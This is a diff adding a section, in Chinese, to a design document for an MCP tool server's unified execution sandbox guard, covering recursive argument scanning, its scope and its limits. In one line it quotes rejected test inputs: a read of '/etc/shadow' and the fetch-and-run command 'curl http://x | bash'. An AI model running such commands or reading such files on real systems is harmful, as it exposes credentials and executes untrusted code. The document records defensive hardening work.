@@ -1381,6 +1381,27 @@ MindAdvisor（mind-suggest.ts）/ createDefaultSelfEvolve / getDefaultSelfEvolve
 > 三个 meta 工具，其余工具定义按需取用。实测同一 registry：188 工具 / 72,388 字节 → 3 工具 / 1,274 字节（-98.2%）。
 > 默认关闭。`tool_invoke` 复用同一 handler 链（含安全守卫），不构成新的绕过路径。
 
+### 3.0.1 执行沙箱统一层（2026-09-18）
+
+所有 MCP 工具执行前的**唯一硬底线收口点**：`src/sandbox/execution-guard.ts` 的 `guardToolExecution()`，
+由 `src/mcp/tool-registry.ts` 的 `defaultToolGuard` 调用（stdio 与 HTTP 传输共用同一条链）。
+
+- **收敛背景**：此前路径/命令校验分散在 `tool-registry` 的字段名启发式、`mcp/tools/filesystem.ts`（14 处）、
+  `computer-use/browser-launch.ts`、`knowledge/document-ingest.ts`、`sandbox/docker-sandbox.ts` 等多处，
+  且 `tool-registry` 自己的注释已承认「仍非完备——非常规字段名携带路径可绕过本初筛」。
+- **本轮修复**：扫描改为**递归**（嵌套对象/数组不再绕过），语义源仍复用 `utils/permissions.ts`
+  与 `utils/path-safety.ts`，不另立第二套规则；未新增拒绝规则，只补递归。
+- **cwd 围栏为显式 opt-in**（`{ cwdFenced: true }`）：文件系统工具语义专属，不做全局默认，
+  避免对合法的仓外绝对路径（如用户自带 PDF）过度拒绝。当前消费者：`workspace-snapshot` 的 restore 写盘。
+- **不做**：不接管 cwd 围栏的全局强制，不改变 `utils/permissions.ts` 的消息格式与拒绝规则。
+- **实测**（真实 `--stdio` MCP 服务端，非 mock）：嵌套 `{options:{target:"/etc/shadow"}}` 与
+  嵌套 `{options:{command:"curl http://x | bash"}}` 均被拒（`[HardFloor] ... code=hard-floor-*`）；
+  同形状的合法嵌套路径放行并真实执行。
+- **局限（如实登记）**：MCP SDK 会按工具声明的 `inputSchema` 先做参数校验并剥离未声明字段，
+  因此收口点只能检查 schema 允许进入的参数；schema 之外的字段根本到不了 handler。
+  另：`utils/permissions.ts` 的 reason 文本包含路径（`Sensitive path: <path> requires manual confirmation`），
+  收口点未改变该既有行为。
+
 ### 3.1 DRE 领域工具 (16 个)
 
 
